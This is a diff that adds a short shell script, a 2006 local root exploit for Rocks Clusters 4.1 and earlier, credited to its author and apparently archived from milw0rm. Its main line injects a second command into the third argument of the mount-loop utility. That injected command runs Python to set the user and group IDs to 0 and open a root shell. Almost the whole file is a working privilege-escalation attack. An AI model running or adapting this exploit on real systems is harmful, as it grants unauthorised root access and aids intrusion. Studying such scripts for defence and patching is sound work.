@@ -1,0 +1,12 @@
+#!/bin/sh
+##############################################################################
+##  rocksmountdirty.sh: Rocks release <=4.1 local root exploit
+##  make sure 'mount-loop' is in your path for this to work.
+##
+##  coded by: xavier@tigerteam.se [http://xavsec.blogspot.com]
+##############################################################################
+echo "Rocks Clusters <=4.1 mount-loop local root exploit by xavier@tigerteam.se [http://xavsec.blogspot.com]"
+echo "getting root.. goodluck"
+mount-loop "null" "null" "null; python -c 'import os;os.setuid(0);os.setgid(0);os.execl(\"/bin/sh\", \"/usr/sbin/httpd\")'"
+
+# milw0rm.com [2006-07-15]
